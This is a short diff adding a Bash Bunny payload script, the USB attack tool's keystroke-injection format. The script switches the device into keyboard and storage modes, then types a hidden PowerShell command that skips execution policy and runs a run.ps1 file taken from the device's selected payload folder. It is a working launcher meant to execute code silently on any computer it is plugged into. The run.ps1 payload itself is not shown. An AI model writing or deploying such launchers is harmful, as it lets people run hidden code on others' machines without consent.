@@ -1,0 +1,8 @@
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+LED ATTACK
+# Run the run.ps1 script in the BashBunny
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\run.ps1')"
+LED FINISH
